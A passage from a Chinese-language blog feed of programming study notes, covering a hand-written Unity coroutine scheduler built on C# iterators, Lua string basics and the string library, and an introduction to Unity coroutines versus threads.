<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">IEnumerator ie = Test();</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">但是我们可以自己执行迭代器函数内容</span></pre></td></tr><tr><td class="code"><pre><span class="line">ie.MoveNext();<span class="comment">//会执行函数中内容遇到 yield return为止的逻辑</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">print(ie.Current);<span class="comment">//得到 yield return 返回的内容</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">ie.MoveNext();</span></pre></td></tr><tr><td class="code"><pre><span class="line">print(ie.Current);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">ie.MoveNext();</span></pre></td></tr><tr><td class="code"><pre><span class="line">print(ie.Current);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">ie.MoveNext();</span></pre></td></tr><tr><td class="code"><pre><span class="line">TestClass tc = ie.Current <span class="keyword">as</span> TestClass;</span></pre></td></tr><tr><td class="code"><pre><span class="line">print(tc.time);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">MoveNext 返回值 代表着 是否到了结尾（这个迭代器函数 是否执行完毕）</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(ie.MoveNext())</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(ie.Current);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>//2.协程调度器<br>继承MonoBehavior后 开启协程<br>相当于是把一个协程函数（迭代器）放入Unity的协程调度器中帮助我们管理进行执行<br>具体的yield return 后面的规则 也是Unity定义的一些规则</p>
<h4 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h4><p>你可以简化理解迭代器函数<br>C#看到迭代器函数和yield return 语法糖<br>就会把原本是一个的 函数 变成”几部分”<br>我们可以通过迭代器 从上到下遍历这 “几部分”进行执行<br>就达到了将一个函数中的逻辑分时执行的目的</p>
<p>而协程调度器就是 利用迭代器函数返回的内容来进行之后的处理<br>比如Unity中的协程调度器<br>根据yield return 返回的内容 决定了下一次在何时继续执行迭代器函数中的”下一部分”</p>
<p>理论上来说 我们可以利用迭代器函数的特点 自己实现协程调度器来取代Unity自带的调度器</p>
<h4 id="4、练习"><a href="#4、练习" class="headerlink" title="4、练习"></a>4、练习</h4><p>通过一道题来更深入地了解Unity中协程的原理</p>
<p><font color="red">请不使用Unity自带的协程协调器开启协程</font></p>
<p><font color="red">通过迭代器函数实现每隔一秒执行函数中的一部分逻辑</font></p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Collections;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> UnityEngine;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">YieldReturnTime</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//记录 下次还要执行的 迭代器接口</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> IEnumerator ie;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//记录 下次执行的时间点</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">float</span> time;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">CoroutineMgr</span> : <span class="title">MonoBehaviour</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> CoroutineMgr instance;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> CoroutineMgr Instance =&gt; instance;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//申明存储 迭代器函数对象的 容器 用于 一会继续执行</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> List&lt;YieldReturnTime&gt; list = <span class="keyword">new</span> List&lt;YieldReturnTime&gt;();</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">// Start is called before the first frame update</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Awake</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        instance = <span class="keyword">this</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">MyStartCoroutine</span>(<span class="params">IEnumerator ie</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//来进行 分步走 分时间执行的逻辑</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//传入一个 迭代器函数返回的结构 那么应该一来就执行它</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//一来就先执行第一步 执行完了 如果返现 返回的true 证明 后面还有步骤</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> (ie.MoveNext())</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="comment">//判断 如果yield return返回的是 数字 是一个int类型 那就证明 是需要等待n秒继续执行</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">if</span> (ie.Current <span class="keyword">is</span> <span class="keyword">int</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                <span class="comment">//按思路 应该把 这个迭代器函数 和它下一次执行的时间点 记录下来</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                <span class="comment">//然后不停检测 时间 是否到达了 下一次执行的 时间点 然后就继续执行它</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                YieldReturnTime y = <span class="keyword">new</span> YieldReturnTime();</span></pre></td></tr><tr><td class="code"><pre><span class="line">                <span class="comment">//记录迭代器接口</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                y.ie = ie;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                <span class="comment">//记录时间</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                y.time = Time.time + (<span class="keyword">int</span>)ie.Current;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                <span class="comment">//把记录的信息 记录到数据容器当中 因为可能有多个协程函数 开启 所以 用一个 list来存储</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                list.Add(y);</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">// Update is called once per frame</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Update</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//为了避免在循环的时候 从列表里面移除内容 我们可以倒着遍历</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = list.Count - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="comment">//判断 当前该迭代器函数 是否到了下一次要执行的时间</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="comment">//如果到了 就需要执行下一步了</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">if</span> (list[i].time &lt;= Time.time)</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                <span class="keyword">if</span> (list[i].ie.MoveNext())</span></pre></td></tr><tr><td class="code"><pre><span class="line">                &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                    <span class="comment">//如果是true 那还需要对该迭代器函数 进行处理</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                    <span class="comment">//如果是 int类型 证明是按秒等待</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                    <span class="keyword">if</span> (list[i].ie.Current <span class="keyword">is</span> <span class="keyword">int</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">                    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                        list[i].time = Time.time + (<span class="keyword">int</span>)list[i].ie.Current;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                    <span class="keyword">else</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                        <span class="comment">//该list 只是存储 处理时间相关 等待逻辑的 迭代器函数的 </span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                        <span class="comment">//如果是别的类型 就不应该 存在这个list中 应该根据类型把它放入别的容器中</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                        list.RemoveAt(i);</span></pre></td></tr><tr><td class="code"><pre><span class="line">                    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                <span class="keyword">else</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                    <span class="comment">//后面已经没有可以等待和执行的了 证明已经执行完毕了逻辑</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                    list.RemoveAt(i);</span></pre></td></tr><tr><td class="code"><pre><span class="line">                &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Collections;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> UnityEngine;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Lesson15Test</span> : <span class="title">MonoBehaviour</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">// Start is called before the first frame update</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//Unity自带的协程协调器 开启协程函数（迭代器函数）</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//StartCoroutine(MyTest());</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">        CoroutineMgr.Instance.MyStartCoroutine(MyTest());</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">// Update is called once per frame</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Update</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function">IEnumerator <span class="title">MyTest</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        print(<span class="string">"1"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">yield</span> <span class="keyword">return</span> <span class="number">1</span>;<span class="comment">//如果是用自带的 开启 那么数字代表等待1帧继续执行之后的内容</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        print(<span class="string">"2"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">yield</span> <span class="keyword">return</span> <span class="number">2</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        print(<span class="string">"3"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">yield</span> <span class="keyword">return</span> <span class="number">3</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        print(<span class="string">"4"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>lua学习笔记(三)</title>
    <url>/2021/03/29/lua%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%89)/</url>
    <content><![CDATA[<center>字符串</center>

<a id="more"></a>

<h2 id="4-字符串"><a href="#4-字符串" class="headerlink" title="4.字符串"></a>4.字符串</h2><h3 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h3><p>Lua语言中的字符串是不可变值，因此不能像c语言中那样直接改变某个字符串中的某个字符，但可以通过创建一个新的字符串来达到修改的目的</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">a = <span class="string">"one string"</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">b = <span class="built_in">string</span>.<span class="built_in">gsub</span>(a, <span class="string">"one"</span>, <span class="string">"another"</span>)  <span class="comment">--将a中one替换成another输出到一个新的字符串中</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(a)</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(b)</span></pre></td></tr></table></figure>

<p>长度操作符#获取字符串的长度</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">a = <span class="string">"hello"</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(#a)     <span class="comment">--5</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(#<span class="string">"Hello World"</span>)   <span class="comment">--11</span></span></pre></td></tr></table></figure>

<p>连接操作符..可以用来字符串的连接，如果操作符中存在数值，那么Lua语言会先把数值转换成字符串：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">&gt; <span class="string">"Hello "</span> .. <span class="string">"World"</span>     <span class="comment">--&gt;  Hello World</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; <span class="string">"result is "</span> .. <span class="number">3</span>        <span class="comment">--&gt;  result is 3</span></span></pre></td></tr></table></figure>

<p>注：Lua语言中，字符串是不可变量。字符串连接总是创建一个新字符串，而不会改变原来作为操作数的字符串。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">&gt; a = <span class="string">"Hello"</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; a .. <span class="string">" World"</span>    <span class="comment">--&gt; Hello World</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt; a                <span class="comment">--&gt; Hello</span></span></pre></td></tr></table></figure>

<h3 id="4-1字符串常量"><a href="#4-1字符串常量" class="headerlink" title="4.1字符串常量"></a>4.1字符串常量</h3><p>使用一堆双引号或单引号来声明字符串常量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; &quot;a line&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">b &#x3D; &#39;another line&#39;</span></pre></td></tr></table></figure>

<p> 长字符串/多行字符串常量可以用可以一对双方括号来声明。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">page &#x3D; [[</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;html&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;head&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line"> &lt;title&gt;An HTML Page&lt;&#x2F;title&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;&#x2F;head&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;body&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line"> &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.lua.org&quot;&gt;Lua&lt;&#x2F;a&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;&#x2F;body&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;&#x2F;html&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">]]</span></pre></td></tr></table></figure>

<p>双引号和单引号声明是等价的。</p>
<p>使用[====[]====]来表示字符串常量，这样，字符串常量只有在遇到了包含相同数量的等号的右方括号才会结束。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">a = <span class="string">[[2569[b]]</span>]  <span class="comment">--&gt;这样会直接报错unexpected symbol near ']'，</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(a)         <span class="comment">--&gt;lua只识别了最近的两个右括号,无法输出2569[b]</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">b = <span class="string">[=[2569[b]]</span>=] <span class="comment">--&gt;使用左右两个[=[   ]=]来识别常量</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(b)          <span class="comment">--&gt;2569[b]</span></span></pre></td></tr></table></figure>

<p>使用–[=[]=]来降低对内部已经包含注释的代码进行注释的难度</p>
<h3 id="4-2强制类型转换"><a href="#4-2强制类型转换" class="headerlink" title="4.2强制类型转换"></a>4.2强制类型转换</h3><p>Lua语言发先需要字符串的地方出现数值时，它就会把数值转换为字符串</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">10</span> .. <span class="number">20</span>)      <span class="comment">--&gt;  1020</span></span></pre></td></tr></table></figure>

<p>当在数值后紧接着使用字符串连接时，必须使用空格将它们分开，否则Lua语言会把第一个点当成小数点。</p>
<p>两个操作数都是整型值时结果才是整数。因此字符串不是整型值，所以任何有字符串参与的算术运算都会被当做浮点运算处理。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">math</span>.<span class="built_in">type</span>(<span class="string">"10"</span> + <span class="number">1</span>))       <span class="comment">--&gt;integer   11  (lua5.4有所变动)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">math</span>.<span class="built_in">type</span>(<span class="string">"10.0"</span> + <span class="number">1</span>))     <span class="comment">--&gt;float     11.0</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">math</span>.<span class="built_in">type</span>(<span class="string">"10"</span> + <span class="number">1.0</span>))     <span class="comment">--&gt;float     11.0</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">math</span>.<span class="built_in">type</span>(<span class="string">"10.0"</span> + <span class="number">1.0</span>))   <span class="comment">--&gt;float     11.0</span></span></pre></td></tr></table></figure>

<h3 id="4-3字符串标准库"><a href="#4-3字符串标准库" class="headerlink" title="4.3字符串标准库"></a>4.3字符串标准库</h3><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span>.<span class="built_in">lower</span>         <span class="comment">--忽略大小写差异</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="built_in">string</span>.<span class="built_in">sub</span>(s,i,j)    <span class="comment">--从字符串s中提取第i个到第j个字符</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="built_in">string</span>.<span class="built_in">char</span>          <span class="comment">--接收零个或多个整数作为参数，然后将每个整数转换成对应的字符，最后返回由这些字符连接而成的字符串</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="built_in">string</span>.<span class="built_in">byte</span>(s,i)     <span class="comment">--返回字符串s中第i个字符的内部数值表示</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">"x = %d y = %d"</span>, <span class="number">10</span> ,<span class="number">20</span>)  <span class="comment">--&gt;x = 10 y = 20</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="built_in">string</span>.<span class="built_in">find</span>(<span class="string">"hello world"</span>, <span class="string">"wor"</span>)   <span class="comment">--&gt; 7   9</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="built_in">string</span>.<span class="built_in">find</span>(<span class="string">"hello world"</span>, <span class="string">"war"</span>)   <span class="comment">--&gt; nil</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="built_in">string</span>.<span class="built_in">gsub</span>          <span class="comment">--把所有匹配的模式用另一个字符串替换</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="built_in">string</span>.<span class="built_in">gsub</span>(<span class="string">"hello world"</span>, <span class="string">"l"</span>, <span class="string">"."</span>)     <span class="comment">--&gt; he..o wor.d    3(替换次数)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="built_in">string</span>.<span class="built_in">gsub</span>(<span class="string">"hello world"</span>, <span class="string">"ll"</span>, <span class="string">".."</span>)   <span class="comment">--&gt; he..o world    1(替换次数)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="built_in">string</span>.<span class="built_in">gsub</span>(<span class="string">"hello world"</span>, <span class="string">"a"</span>, <span class="string">"."</span>)     <span class="comment">--&gt; hello world    0(替换次数)</span></span></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>untiy协程</title>
    <url>/2021/05/16/untiy%E5%8D%8F%E7%A8%8B/</url>
    <content><![CDATA[<center>Unity协程</center>

<p>学习了Unity中协程，记录一下</p>
<a id="more"></a>

<h4 id="1、Unity是否支持多线程？"><a href="#1、Unity是否支持多线程？" class="headerlink" title="1、Unity是否支持多线程？"></a>1、Unity是否支持多线程？</h4><p>首先要明确一点<br>Unity是支持多线程的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Thread t;</span></pre></td></tr><tr><td class="code"><pre><span class="line">void Start()</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	t &#x3D; new Thread(Test);</span></pre></td></tr><tr><td class="code"><pre><span class="line">	t.Start();</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">public void Test()</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p><font color="red"> 只是新开线程无法访问Unity相关对象的内容 </font><br>注意：Unity中的多线程 要记住关闭</p>
<p>若不关闭会导致即使停止运行Unity编辑器也会继续运行。<br>线程一般在物体销毁时去关闭</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnDestroy</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    t.Abort();</span></pre></td></tr><tr><td class="code"><pre><span class="line">    t = <span class="literal">null</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>



<h4 id="2、协同程序是什么？"><a href="#2、协同程序是什么？" class="headerlink" title="2、协同程序是什么？"></a>2、协同程序是什么？</h4><p>协同程序简称协程<br>它是“假”的多线程，它不是多线程</p>
<p>它的主要作用<br>将代码分时执行，不卡主线程<br>简单理解，是把可能会让主线程卡顿的耗时的逻辑分时分步执行</p>
<p>主要使用场景<br>异步加载文件<br>异步下载文件<br>场景异步加载<br>批量创建时防止卡顿</p>
<h4 id="3、协同程序和线程的区别"><a href="#3、协同程序和线程的区别" class="headerlink" title="3、协同程序和线程的区别"></a>3、协同程序和线程的区别</h4><p>新开一个线程是独立的一个管道，和主线程并行执行<br>新开一个协程是在原线程之上开启，进行逻辑分时分步执行</p>
<h4 id="4、协程的使用"><a href="#4、协程的使用" class="headerlink" title="4、协程的使用"></a>4、协程的使用</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function">IEnumerator <span class="title">MyCoroutine</span>(<span class="params"><span class="keyword">int</span> i, <span class="keyword">string</span> str</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(i);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//关键点二： 协程函数当中 必须使用 yield return 进行返回</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">yield</span> <span class="keyword">return</span> <span class="literal">null</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(str);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">yield</span> return new <span class="title">WaitForSeconds</span>(<span class="params"><span class="number">1f</span></span>)</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(<span class="string">"2"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">yield</span> return new <span class="title">WaitForFixedUpdate</span>(<span class="params"></span>)</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(<span class="string">"3"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//主要会用来 截图时 会使用</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">yield</span> return new <span class="title">WaitForEndOfFrame</span>(<span class="params"></span>)</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        print(<span class="string">"5"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">WaitForSeconds</span>(<span class="params"><span class="number">5f</span></span>)</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>继承MonoBehavior的类 都可以开启 协程函数<br>第一步：申明协程函数<br>协程函数2个关键点<br>1-1返回值为IEnumerator类型及其子类<br>1-2函数中通过 yield return 返回值; 进行返回</p>
<p>第二步：开启协程函数<br>协程函数 是不能够 直接这样去执行的！！！！！！！</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">这样执行没有任何效果</span></pre></td></tr><tr><td class="code"><pre><span class="line">MyCoroutine(<span class="number">1</span>, <span class="string">"123"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">常用开启方式</span></pre></td></tr><tr><td class="code"><pre><span class="line">IEnumerator ie = MyCoroutine(<span class="number">1</span>, <span class="string">"123"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">StartCoroutine(ie);</span></pre></td></tr><tr><td class="code"><pre><span class="line">Coroutine c1 = StartCoroutine( MyCoroutine(<span class="number">1</span>, <span class="string">"123"</span>));</span></pre></td></tr></table></figure>

<p>第三步：关闭协程</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//关闭所有协程</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">StopAllCoroutines();</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//关闭指定协程</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//注：若之前开启了多个同名的协程也会被关闭</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">StopCoroutine(c1);</span></pre></td></tr></table></figure>

